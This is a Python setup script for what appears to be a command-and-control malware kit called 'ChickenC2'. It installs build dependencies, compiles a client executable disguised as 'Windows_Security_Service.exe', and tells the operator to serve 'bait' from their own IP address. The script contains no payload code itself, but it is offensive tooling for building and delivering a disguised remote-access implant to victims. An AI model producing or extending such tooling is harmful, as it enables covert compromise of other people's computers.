# setup.py
import subprocess
import sys
import os

def run_cmd(cmd, desc):
    print(f"[*] {desc}...")
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return True
        print(f"[-] Error: {result.stderr}")
        return False
    except Exception as e:
        print(f"[-] Exception: {e}")
        return False

def main():
    print("🐔 ChickenC2 Framework Setup 🐔")
    print("=" * 40)
    
    # Install dependencies
    deps = ["pillow", "pyinstaller", "requests"]
    for dep in deps:
        if not run_cmd(f"{sys.executable} -m pip install {dep}", f"Installing {dep}"):
            return
    
    # Build client
    if not run_cmd(f"{sys.executable} build_client.py", "Building client"):
        return
    
    print("\n[✅] Setup complete!")
    print("\nNext steps:")
    print("1. Run: python farmer.py")
    print("2. Client is in dist/Windows_Security_Service.exe")
    print("3. Access bait at: http://your-ip/")

if __name__ == "__main__":
    main()